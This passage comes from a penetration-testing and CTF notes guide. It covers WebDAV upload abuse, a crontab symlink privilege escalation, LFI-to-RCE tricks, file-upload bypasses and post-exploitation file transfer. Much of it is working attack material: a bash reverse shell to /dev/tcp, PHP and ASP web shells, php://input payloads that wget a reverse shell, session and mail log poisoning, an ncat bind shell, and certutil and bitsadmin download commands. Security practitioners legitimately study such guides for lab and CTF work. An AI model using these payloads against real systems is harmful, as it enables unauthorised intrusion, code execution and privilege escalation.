    EXEC  jhtml FAIL
    EXEC  php   FAIL
    EXEC  jsp   FAIL
    EXEC  txt   SUCCEED:  http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
    
    ********************************************************
    /usr/bin/davtest Summary:
    Created: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0
    PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.pl
    PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
    PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.cfm
    PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jhtml
    PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.php
    PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.jsp
    PUT File: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
    Executes: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.html
    Executes: http://10.54.98.15/DavTestDir_E3u9ISnNswYes0/davtest_E3u9ISnNswYes0.txt
    ```

    Now, we can see that pl, html, txt and other files can be uploaded. Now, if the MOVE method is enabled, we can upload a aspx meterpreter in a text file and then MOVE the .txt file to .aspx and execute the aspx file by using

    ```none
    MOVE /shell.txt HTTP/1.1
    Host: example.com
    Destination: /shell.aspx
    ```

  - In one of the VM, one of the task was to capture the RAM of the system by using LiME ~ Linux Memory Extractor ( which is executed by suid binary with root privileges ). Let's say the ramdump was saved at

    ```none
    /tmp/ramdump
    ```

    If, you create a symlink from /tmp/ramdump to /etc/crontab

    ```none
    ln -s /etc/crontab /tmp/ramdump
    ```

    Now, when the ramdump is taken, lime will now dump the content of RAM straight into /etc/crontab. As crontab will ignore everything which doesn’t match the correct syntax. If the memory contains a injected string such as

    ```none
    cat cron.py
    print "* * * * * root /bin/bash /home/username/evilscript"
    ```
  
    the injected string will end up in /etc/crontab will be executed.

    The contents of evilscript can be

    ```none
    /bin/bash -i >& /dev/tcp/IP/Port 0>&1
    ```

    which will provide the root shell to the attacker. Thanks to TheColonial :)

  - [phpbash](https://github.com/Arrexel/phpbash) is a standalone, semi-interactive web shell. It's main purpose is to assist in penetration tests where traditional reverse shells are not possible.

  - ps aux not fully visible try

    ```none
    echo "`ps aux --sort -rss`"
    ```

  - If there's a XXE on a website and possible RFI using internal address i.e on <http://127.0.0.1:80/home=RFI> rather than <http://10.54.98.10:80/home=RFI>, utilize XXE to send the request with localaddress.

  - If there's a possible command execution on a website such as

    ```none
    curl -A "bitvijays" -i "http://IPAddress/example?parameter='linux_command'"
    ```

    However, it is protected by a WAF, probably, try bash globbling techniques with ? and \*. Refer [Web Application Firewall (WAF) Evasion Techniques](https://medium.com/secjuice/waf-evasion-techniques-718026d693d8) and [Web Application Firewall (WAF) Evasion Techniques #2](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0) ! Amazing stuff here! Also, it might be a good idea to test the command with ? on your local machine first then directly on the target. Also, sometimes, it adding a space before or after the linux_command might work like ' linux_command' or 'linux_command '

  - Similar to ls there is dir in linux. Try "dir -l" Might be helpful sometimes.

  - Sometimes, we don't have tools on the victim machine, in that case we can download static binaries from [Static-Binaries](https://github.com/andrew-d/static-binaries) If not, found, try the deb or rpm package of the binary, extract it and upload.

  - mysql can execute statements in one liner using --execute or -e option

    ```none
    mysql [options] db_name
    --user=user_name, -u user_name  : The MariaDB user name to use when connecting to the server.
    --password[=password], -p[password] : The password to use when connecting to the server. If you use the short option form (-p), you cannot have a space between the option and the password. If you omit the password value following the --password or -p option on the command line, mysql
           prompts for one.
    --execute=statement, -e statement : Execute the statement and quit. Disables --force and history file. The default output format is like that produced with --batch.
    ```

  - If there's .action file present in the URL on a Apache WebServer, [Apache Struts](https://svn.apache.org/repos/asf/struts/archive/trunk/struts-doc-1.1/api/org/apache/struts/action/package-summary.html) might be installed on it. Check for Apache Struts vulnerabilities on it.

  - Windows XP Machine ? and we are able to put some files anywhere? Refer [Playing with MOF files on Windows, for fun & profit](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html)

  - Good Post Exploitation Guide [Windows Post-Exploitation Command List](http://www.handgrep.se/repository/cheatsheets/postexploitation/WindowsPost-Exploitation.pdf)

  - Oracle Padding Attacks? Refer [PadBuster](https://github.com/GDSSecurity/PadBuster)

  - If there's a cron job with

    ```none
    * * * * * php /path-to-your-project/artisan schedule:run >> /dev/null 2>&1
    ```

    possibly, we can edit schedule method of the App\Console\Kernel class (Kernel.php) in App\Console\Kernel and use exec method to execute commands on the operating systems.

    ```none
    $schedule->exec('node /home/forge/script.js')->daily();
    ```

    Refer [Task Scheduling](https://laravel.com/docs/5.6/scheduling)

  - Handy Stuff

    - Utilize xxd to convert hex to ascii

      ```none
      xxd -r -p
      -p | -ps | -postscript | -plain : output in postscript continuous hexdump style. Also known as plain hexdump style.
      -r | -revert : reverse operation: convert (or patch) hexdump into binary.  If not writing to stdout, xxd writes into its output file without truncating it. Use the combination -r -p to read plain hexadecimal dumps without line number information and without a particular column layout. Additional Whitespace and line-breaks are allowed anywhere.
      ```

    - We may use base64 -w 0 to disable line wrapping while encoding files with base64.
    - Use python

      - binascii.unhexlify(hexstr) to convert hex to string
      - base64.decodestring(str) to decode base64 string
      - Convert number to hex

          ```none
          hex(15)
          '0xf'
          ```

      - Convert hex to decimal

        ```none
        s = "6a48f82d8e828ce82b82"
        i = int(s, 16)
        ```

      - If we are able to execute python code maybe use popen to execute os commands.

        ```none
        import os;
        os.popen("whoami").read()
        ```

    - Getting out of more
  
      If in somecase, we are unable to ssh into the machine or being logged out when trying ssh, check the /etc/passwd file for the shell defined for that user.

      ```none
      cat /etc/passwd | grep user1
      user1:x:11026:11026:user level 1:/home/user1:/usr/bin/showtext
      ```

      Here Instead of /bin/bash, user1 is using /usr/bin/showtext, which is apparently not a shell. Let’s look at the content of the file

      ```none
      cat /usr/bin/showtext
      #!/bin/sh
      more ~/text.txt
      exit 0
      ```

      In such cases, First, minimize your terminal so that when we are logged into user1 via ssh command, the large text will force a “more” message to prompt us to continue the output. Now that we have forced the terminal to prompt us to continue the display via “more” or “–More–(50%)” in this case, press “v” to enter “vim”, a built-in text editor on Unix machines. Once, we have vim interface, use :shell to get a shell.

    - List all the files together

      ```none
      find /home -type f -printf "%f\t%p\t%u\%g\t%m\n" 2>/dev/null | column -t
      ```

## Cyber-Deception

### Wordpot

[Wordpot](https://github.com/gbrindisi/wordpot) : Wordpot is a Wordpress honeypot which detects probes for plugins, themes, timthumb and other common files used to fingerprint a wordpress installation.

```none
python /opt/wp/wordpot.py --host=$lanip --port=69 --title=Welcome to XXXXXXX Blog Beta --ver=1.0 --server=XXXXXXXWordpress
```

### FakeSMTP

[FakeSMTP](http://nilhcem.com/FakeSMTP/) : FakeSMTP is a Free Fake SMTP Server with GUI for testing emails in applications easily.

```none
java -jar /opt/fakesmtp/target/fakeSMTP-2.1-SNAPSHOT.jar -s -b -p 2525 127.0.0.1 -o /home/username
```

### Rubberglue

[Rubberglue](https://github.com/adhdproject/adhdproject.github.io/blob/master/Tools/Rubberglue.md) : We can use Rubberglue to listen on a port such that any traffic it receives on that port it will forward back to the client ( attacker ) on the same port.

```none
python2 /opt/honeyports/honeyports-0.4.py -p 23
```

### Knockd

[Knockd - Port-knocking server](http://www.zeroflux.org/projects/knock) : knockd is a port-knock server. It listens to all traffic on an ethernet (or PPP) interface, looking for special "knock" sequences of port-hits. A client makes these port-hits by sending a TCP (or UDP) packet to a port on the server. This port need not be open -- since knockd listens at the link-layer level, it sees all traffic even if it's destined for a closed port. When the server detects a specific sequence of port-hits, it runs a command defined in its configuration file. This can be used to open up holes in a firewall for quick access.

If there is port knocking involved, read the /etc/knockd.conf, read the sequence port knock should be done and execute

```none
for PORT in 43059 22435 17432; do nmap -PN 192.168.56.203 -p $PORT; done
```

### DCEPT

SecureWorks researchers have created a solution known as [DCEPT (Domain Controller Enticing Password Tripwire)](https://www.secureworks.com/blog/dcept) to detect network intrusions. Github is [dcept](https://github.com/secureworks/dcept).

## Useful Tools

- [exe2hex](https://github.com/g0tmi1k/exe2hex) : Inline file transfer using in-built Windows tools (DEBUG.exe or PowerShell).

- [Powercat](https://github.com/secabstraction/PowerCat) : A PowerShell TCP/IP swiss army knife that works with Netcat & Ncat

- [Unicorn](https://github.com/trustedsec/unicorn) is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory.

- [Nishang](https://github.com/samratashok/nishang) is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming.

- [Ncat](https://nmap.org/book/ncat-man-examples.html) Ncat is a feature-packed networking utility which reads and writes data across networks from the command line. Ncat was written for the Nmap Project and is the culmination of the currently splintered family of Netcat incarnations. It is designed to be a reliable back-end tool to instantly provide network connectivity to other applications and users. Ncat will not only work with IPv4 and IPv6 but provides the user with a virtually limitless number of potential uses. Among Ncat's vast number of features there is the ability to chain Ncats together; redirection of TCP, UDP, and SCTP ports to other sites; SSL support; and proxy connections via SOCKS4, SOCKS5 or HTTP proxies (with optional proxy authentication as well). Some general principles apply to most applications and thus give you the capability of instantly adding networking support to software that would normally never support it.

  Few important example is

  Redirect any incoming traffic on TCP port 8080 on the local machine to host (example.org -in below example) on port 80.

  ```none
  ncat --sh-exec "ncat example.org 80" -l 8080 --keep-open
  ```

  Bind to TCP port 8081 and attach /bin/bash for the world to access freely.

  ```none
  ncat --exec "/bin/bash" -l 8081 --keep-open""
  ```

## Appendix-I : Local File Inclusion

Local File Inclusion (LFI) is a type of vulnerability concerning web server. It allow an attacker to include a local file on the web server. It occurs due to the use of not properly sanitized user input.

### Tools

To test LFI, RFI, we can also use [Uniscan](http://tools.kali.org/web-applications/uniscan) Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner.

```none
uniscan -h
OPTIONS:
  -h  help
  -u  <url> example: https://www.example.com/
  -f  <file> list of url's
  -b  Uniscan go to background
  -q  Enable Directory checks
  -w  Enable File checks
  -e  Enable robots.txt and sitemap.xml check
  -d  Enable Dynamic checks
  -s  Enable Static checks
  -r  Enable Stress checks
  -i  <dork> Bing search
  -o  <dork> Google search
  -g  Web fingerprint
  -j  Server fingerprint

usage:
[1] perl ./uniscan.pl -u http://www.example.com/ -qweds
[2] perl ./uniscan.pl -f sites.txt -bqweds
[3] perl ./uniscan.pl -i uniscan
[4] perl ./uniscan.pl -i "ip:xxx.xxx.xxx.xxx"
[5] perl ./uniscan.pl -o "inurl:test"
[6] perl ./uniscan.pl -u https://www.example.com/ -r
```

There's another tool called [fimap](https://tools.kali.org/web-applications/fimap). However, it is better to check the source of uniscan for LFI and see what it is trying and try that with curl specially if cookies are required to set (in case of authenticated LFI). Personally, I tried Uniscan and for some reason cookie feature was not working and fimap only support POST parameter in cookie no GET.

Note

Also, if we have unprivileged user shell or an ability to store a file somewhere in the filesystem, however don't have permission to write in /var/www/html but does have LFI, we can still write (php meterpreter shell) in /tmp or user home directory and utilize LFI to get a reverse shell.

#### Filtering in LFI

Sometimes, there might be some filtering applied by default. For example: filename=secret.txt, here it is possible that it will only read files named secret.txt or with extension .txt. So, may be rename your payload accordingly.

For example: the below code only includes the file which are named secret

```php
<?php
  $file = @$_GET['filname'];
  if(strlen($file) > 55)
    exit("File name too long.");
  $fileName = basename($file);
  if(!strpos($file, "secret"))
    exit("No secret is selected.");
  echo "<pre>";
  include($file);
  echo "</pre>";
?>
```

### LFI to Remote Code Execution

Mainly taken from [LFI-Cheat-Sheet](https://highon.coffee/blog/lfi-cheat-sheet/) , [Exploiting PHP File Inclusion – Overview](https://websec.wordpress.com/2010/02/22/exploiting-php-file-inclusion-overview/) and [Upgrade from LFI to RCE via PHP Sessions <https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/>`_

There are variety of different tricks to turn your LFI into RCE. Using

#### File upload forms/ functions

Figure out if there are any upload forms or functions, we will upload your malicious code to the victim server, which can be executed.

#### PHP wrapper expect://command

Allows execution of system commands via the php expect wrapper, unfortunately this is not enabled by default.

An example of PHP expect:

```none
http://IP/fileincl/example1.php?page=expect://ls
```

If PHP expect wrapper is disabled, below error is encountered.

```none
Warning: include(): Unable to find the wrapper "expect" - did you forget to enable it when you<br> configured PHP? in /var/www/fileincl/example1.php on line 7 
Warning: include(): Unable to find the<br> wrapper "expect" - did you forget to enable it when you configured PHP? in <br> /var/www/fileincl/example1.php on line 7 
Warning: include(expect://ls): failed to open stream: No such file or directory in /var/www/fileincl/example1.php on line 7 
Warning: include(): Failed opening 'expect://ls' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/fileincl/example1.php on line 7
```

#### PHP Wrapper zip

Let's say there is a upload functionality on the victim machine, however the file saved doesn't have executeable permission, in that case if we upload a zip file containing a shellcode such as

Creating a php payload for listing current directory files (There can be other payload also. For example, php meterpreter, if the "system" is blocked use, scandir() for directory listing etc. )

```none
echo "<?php system("ls"); ?>" > shell.php
```

and

```none
zip shell.zip shell.php
```

Now, if we upload this zip file somehow to the victim machine and know it's location (Let's say it got uploaded in /uploads) and filename (is def506bd2176265e006f2db3d7b4e9db11c459c1), we can do remote code execution

[Zip Usage](http://php.net/manual/en/wrappers.compression.php)

```none
zip://archive.zip#dir/file.txt
```

Burp Request

```none
GET /?parameter=zip://uploads/def506bd2176265e006f2db3d7b4e9db11c459c1%23shell HTTP/1.1
Host: 10.50.66.93
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0

%23 is the #
```

and we get RCE

```none
index.php
upload.php
uploads
```

We may read more about it at [Bypassing PHP Null Byte Injection protections – Part II – CTF Write-up](https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/) or [CodeGate General CTF 2015: Owlur](https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/web/owlur) -- Read other write-ups in this.

#### PHP Wrapper phar

RCE can also be done using [Using Phar Archives: the phar stream wrapper](http://php.net/manual/en/phar.using.stream.php)

#### PHP wrapper php

#### PHP wrapper php://filter

php://filter is a kind of meta-wrapper designed to permit the application of filters to a stream at the time of opening. This is useful with all-in-one file functions such as readfile(), file(), and file_get_contents() where there is otherwise no opportunity to apply a filter to the stream prior the contents being read.

The output is encoded using base64, so you’ll need to decode the output.

```none
http://IP/fileincl/example1.php?page=php://filter/convert.base64-encode/resource=../../../../../etc/passwd
```

or

We could use php filter to read the source code of a PHP File

```none
http://xqi.cc/index.php?m=php://filter/read=convert.base64-encode/resource=index.php
```

More information can be found at [Using PHP for file inclusion](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/)

#### PHP input:// stream

php://input allows you to read raw POST data. It is a less memory intensive alternative to $HTTP_RAW_POST_DATA and does not need any special php.ini directives. php://input is not available with enctype=”multipart/form-data”.

Send your payload in the POST request using curl, burp.

Example:

```none
http://IP/fileincl/example1.php?page=php://input
```

Post Data payload:

```none
<? system('wget http://IP/php-reverse-shell.php -O /var/www/shell.php');?>
```

After uploading execute the reverse shell at

```none
http://IP/shell.php
```

#### data://text/plain;base64,command

#### /proc/self/environ

If it’s possible to include /proc/self/environ from your vulnerable LFI script, then code execution can be leveraged by manipulating the User Agent parameter with Burp. After the PHP code has been introduced /proc/self/environ can be executed via your vulnerable LFI script.

#### /proc/self/fd

If it’s possible to introduce code into the proc log files that can be executed via your vulnerable LFI script. Typically you would use burp or curl to inject PHP code into the referer.

This method is a little tricky as the proc file that contains the Apache error log information changes under /proc/self/fd/ e.g. /proc/self/fd/2, /proc/self/fd/10 etc.
Utilize [LFI-LogFileCheck.txt](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion%20-%20Path%20Traversal/Intruders/LFI-LogFileCheck.txt) with Burp Intruder, and check for the returned page sizes.

#### Control over PHP Session Values

Let's say, a vulnerable page is present with the post request

```none
POST /upload/? HTTP/1.1
Host: vulnerable.redacted.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
Content-Length: 44
Connection: close
Upgrade-Insecure-Requests: 1

login=1&user=admin&pass=admin&lang=en_us.php
```

with LFI

```none
login=1&user=admin&pass=admin&lang=../../../../../../../../../../etc/passwd
```

Now, the server store cookies

```none
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
Set-Cookie: pass=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```

As we know PHP5 stores it’s session files by default under /var/lib/php5/sess_[PHPSESSID]. (If not, do check phpinfo and figure out the location of temp files) – so the above issued session “i56kgbsq9rm8ndg3qbarhsbm27” would be stored under /var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27

Now, we can write the cookie with a php command

```none
POST /upload/? HTTP/1.1
Host: vulnerable.redacted.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27
Content-Length: 134
Connection: close
Upgrade-Insecure-Requests: 1

login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```

This would result in

```none
Set-Cookie: user=%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E; expires=Mon, 13-Aug-2018 20:40:53 GMT; path=/; httponly
```

Now, the php command can be executed using

```none
POST /upload/? HTTP/1.1
Host: vulnerable.redacted.com
User-Agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.04
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 141
Connection: close
Upgrade-Insecure-Requests: 1

login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
```

The session file could again afterwards be included using the LFI (note that you need to remove the cookie from the request, otherwise it would get overwritten again and the payload would fail)

#### Email Server

If the email server allows you to send email unauthorized and we know the usernames on the system, we probably can utilize it to do remote code execution by using telnet and connecting to port 25

```none
EHLO example.com
VRFY username@example.com
MAIL FROM: pwned@domain.com
RCPT TO: username@example.com
DATA

Subject: Owned
<?php echo system($_REQUEST['cmd']); ?>

.

Mail Queued
```

and as we have LFI, we can read the email by

```none
../../../var/mail/username &cmd=whoami
```

The above would probably differ on the request of your LFI.

## Appendix-II : File Upload

### Examples

Note

If sometimes, we are trying to upload a php file and it's not a allowed extension, maybe try with php5 extension. The file extension tells the web server which version of PHP to use. Some web servers are set up so that PHP 4 is the default, and you have to use .php5 to tell it to use PHP 5.

#### Simple File Upload

Intercepting the request in Burp/ ZAP and changing the file-extension.

Below is the PHP code

```none
<?  

function genRandomString() { 
  $length = 10; 
  $characters = "0123456789abcdefghijklmnopqrstuvwxyz"; 
  $string = "";     

  for ($p = 0; $p < $length; $p++) { 
      $string .= $characters[mt_rand(0, strlen($characters)-1)]; 
  } 

  return $string; 
} 

function makeRandomPath($dir, $ext) { 
  do { 
  $path = $dir."/".genRandomString().".".$ext; 
  } while(file_exists($path)); 
  return $path; 
} 

function makeRandomPathFromFilename($dir, $fn) { 
  $ext = pathinfo($fn, PATHINFO_EXTENSION); 
  return makeRandomPath($dir, $ext); 
} 

if(array_key_exists("filename", $_POST)) { 
  $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
    
    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
      echo "File is too big"; 
  } else { 
    if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
      echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
    } else{ 
      echo "There was an error uploading the file, please try again!"; 
    } 
  } 
} else { 
?> 
<form enctype="multipart/form-data" action="index.php" method="POST">  
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />  
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />  
Choose a JPEG to upload (max 1KB):<br/>  
<input name="uploadedfile" type="file" /><br />  
<input type="submit" value="Upload File" />  
</form>  
<? } ?>
```

If we change the extension of filename tag from JPG to PHP, we may be able to execute code remotely.

- Create a fake JPG containing php code.

  We’ll be using system() to read our password.

  ```none
  echo "<?php system($_GET["cmd"]); ?>" > shell.jpg  
  ```

- Upload JPG, intercept in Burp/ ZAP and change the extension

  ```none
  <input name="filename" value="o0xn5q93si.jpg" type="hidden">  
  ```

  is changed to

  ```none
  <input name="filename" value="o0xn5q93si.php" type="hidden">  
  ```

#### Simple File Upload - With verifying image type

In this the above PHP code remain almost the same apart from little addition that we check the filetype of the file uploaded

```php
<?php  
...  
  
else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {  
      echo "File is not an image";  
  }  
  
...  
  
?>
```

Since the exif_imagetype function checks the filetype of the uploaded file. It checks the first bytes of an image are against a signature. Most filetypes such as JPEG, ZIP, TAR, etc. have a "Magic Number" at the beginning of the file to help verify its file type. So to pass the exif_imagetype function check, our file must start with the magic number of a supported image format.

- Take a valid file (JPG or whichever file format, we are trying to bypass), take the valid hexdump of that file (Let's say first 100 bytes)

  ```none
  hexdump -n 100 -e '100/1 "\\x%02X" "\n"' sunflower.jpg

  -n length         : Interpret only length bytes of Input
  -e format_string  : Specify a format string to be used for displaying data
  ```

  Example:

  ```none
  hexdump -n 100 -e '100/1 "\\x%02X" "\n"' sunflower.jpg
  \xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x01\x01\x01\x2C\x01\x2C\x00\x00\xFF\xE1\x00\x16\x45\x78\x69\x66\x00\x00\x4D\x4D\x00\x2A\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\xFF\xDB\x00\x43\x00\x05\x03\x04\x04\x04\x03\x05\x04\x04\x04\x05\x05\x05\x06\x07\x0C\x08\x07\x07\x07\x07\x0F\x0B\x0B\x09\x0C\x11\x0F\x12\x12\x11\x0F\x11\x11\x13\x16\x1C\x17\x13\x14\x1A\x15\x11\x11\x18\x21\x18\x1A\x1D\x1D\x1F
  ```
  
- Create a file with JPG header and command shell code using python

  ```none
  >>> fh = open('shell.php','w')  
  >>> fh.write('The Hexdump from above \xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')  
  >>> fh.close()
  ```

Tip

Do check the source code of the page for any client-side file validation or any commented hidden parameters?

We can also upload an actual .jpeg, but alter the coments in the metadata to include the php code.

#### Modifying File Upload Page

Upload forms are client-side, we can probably modify them using Inspect Element or F12. If by-chance, there's a LFI and we have seen the code of upload function. The first thing to check would be "What are the restrictions on upload i.e. Either only jpg file extension is uploaded or is file content is also check etc."

Let's say, there is a upload form which has a text-field for accepting input (Let's say - suspectinfo) and the input put in this text field is stored in a file format on the server. Let's see the current form in inspect-element.

Client-Side Code

```none
<form enctype="multipart/form-data" action="?op=upload" method="POST">
  <textarea style="width:400px; height:150px;" id="sinfo" name="sinfo"> </textarea><br>
    <input type="text" id="name" name="name" value="" style="width:355px;">
  <input type="submit" name="submit" value="Send Tip!">
</form>
```

If we see the above form, accepts two inputs

- text type field named sinfo for providing detailed information about the server and
- text type field named name for providing name of the server.

Let's also see, serverside code

```none
if(isset($_POST['submit']) && isset($_POST['sinfo'])) {
      $tip = $_POST['sinfo'];
        $secretname = Random_Filename();  ## Generates a random file name
            $location = Random_Number();      ## Generate a random number
        file_put_contents("uploads/". $location . '/' . $secretname,  $sinfo);
```

If we see, the contents of sinfo are directly put in a file.

In this case, if we change the input type of sinfo from text to file. We can upload a file! Imagine uploading a zip file or php file.

```none
<form enctype="multipart/form-data" action="?op=upload" method="POST">
#  <textarea style="width:400px; height:150px;" id="sinfo" name="sinfo"> </textarea><br> ---------- We have commented this and add the below line.
      <input type="file" id="sinfo" name="sinfo" value="" style="width:355px;">
      <input type="text" id="name" name="name" value="" style="width:355px;">
    <input type="submit" name="submit" value="Send Tip!">
</form>
```

Now, when we press submit button, probably, just make sure that the request is quite similar to the original one and we should be able to upload the file.

Tip

Sometimes, there might be cases when the developer has a commented a input type on the client side, however has forgotten to comment on the serverside code! Maybe, try to uncomment and see what happens!

#### IIS - Web.config Upload

If we are able to upload a web.config file by a file upload functionality in IIS - Windows machine, there might be a possibility of remote code execution.

A web.config file lets you customize the way site or a specific directory on site behaves. For example, if you place a web.config file in your root directory, it will affect your entire site. If you place it in a /content directory, it will only affect that directory.

With a web.config file, you can control:

- Database connection strings.
- Error behavior.
- Security.

Refer [Upload a web.config File for Fun & Profit](https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/) and [RCE by uploading a web.config](https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/)

We can upload the below web.config

```none
<?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config" />
          </fileExtensions>
          <hiddenSegments>
            <remove segment="web.config" />
          </hiddenSegments>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
<%
set cmd = Request.QueryString("cmd")
Set os = Server.CreateObject("WSCRIPT.SHELL")
output = os.exec("cmd.exe /c " + cmd).stdout.readall
response.write output
%>
```

The above expects a parameter cmd which is executed using wscript.shell and can be executed like

```none
http://IP/uploads/web.config?cmd=whoami
```

## Appendix-III Transferring Files from Linux to Windows (post-exploitation)

There would times, where we have a Windows Shell (Command Prompt) and need to copy over some files to the Windows OS. Most of the stuff has been completely taken from [Transferring Files from Linux to Windows (post-exploitation)](https://blog.ropnop.com/transferring-files-from-kali-to-windows/) Here are the few methods

### SMB

We need to setup a SMB Server on the Debian/ Kali machine

#### SMB Server - Attacker

We can utilize Impacket smbserver to create a SMB Server without authentication, so that anyone can access the share and download the files.

```none
/usr/share/doc/python-impacket/examples/smbserver.py
Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

usage: smbserver.py [-h] [-comment COMMENT] [-debug] [-smb2support]
                    shareName sharePath

This script will launch a SMB Server and add a share specified as an argument.
You need to be root in order to bind to port 445. No authentication will be
enforced. Example: smbserver.py -comment 'My share' TMP /tmp

positional arguments:
  shareName         name of the share to add
  sharePath         path of the share to add

optional arguments:
  -h, --help        show this help message and exit
  -comment COMMENT  share's comment to display when asked for shares
  -debug            Turn DEBUG output ON
  -smb2support      SMB2 Support (experimental!)
```

So, we can setup by using

```none
python smbserver.py SHELLS /root/Desktop/SHELLS

Impacket v0.9.15 - Copyright 2002-2016 Core Security Technologies

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

#### Accessing the share - Linux

We can use smbclient to access the share

```none
smbclient -L 10.10.10.10 --no-pass
WARNING: The "syslog" option is deprecated

  Sharename       Type      Comment
  ---------       ----      -------
  IPC$            Disk      
  SHELLS          Disk      
Reconnecting with SMB1 for workgroup listing.
Connection to localhost failed (Error NT_STATUS_NETWORK_UNREACHABLE)
Failed to connect with SMB1 -- no workgroup available
```

#### Accessing the share - Windows

We can use net view to check the shares

```none
net view \\10.10.10.10
 
Shared resources at \\10.10.10.10

(null)

Share name Type Used as Comment
-------------------------------
SHELLS     Disk
The command completed sucessfully
```

#### Copying the Files - Windows

From the Windows Command Prompt

```none
dir \\10.10.14.16\SHELLS

Volume in drive \\10.10.14.16\SHELLS has no label.
Volume Serial Number is ABCD-EFAA

Directory of \\10.10.14.16\SHELLS

04/10/2018  11:47 AM    <DIR>          .
04/08/2018  06:25 PM    <DIR>          ..
04/10/2018  11:47 AM            73,802 ps.exe
              1 File(s)        101,696 bytes
              2 Dir(s)  15,207,469,056 bytes free
```

We can directly copy the file

```none
C:\Users\bitvijays\Desktop> copy \\10.10.14.16\SHELLS\ps.exe .
        1 file(s) copied.
```

or directly execute it without copying

```none
\\10.10.14.16\SHELLS\ps.exe

ps.exe can be your meterpreter exe
```

### HTTP

#### Setting up the Server

We can use python-SimpleHTTPServer to set up a HTTP Web Server

```none
python -m SimpleHTTPServer
```

#### Accessing the Server - Windows

**Windows Command Prompt**

We can use powershell to download a file from a command prompt

```none
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.10:8000/ps.exe','C:\Users\bitvijays\Desktop\ps.exe')"
```

**CertUtil**

CertUtil command can be abused to download a file from internet.

```none
certutil.exe -urlcache -split -f "https://download.sysinternals.com/files/PSTools.zip" pstools.zip
```

**Bitsadmin**

```none
bitsadmin /transfer myDownloadJob /download /priority normal http://10.10.10.10:8000/ps.exe c:\Users\bitvijays\Desktop\ps.exe
```

### FTP

We can utilize FTP to download/ upload files from a ftp server. FTP Client is usually installed on Windows by default.

Note

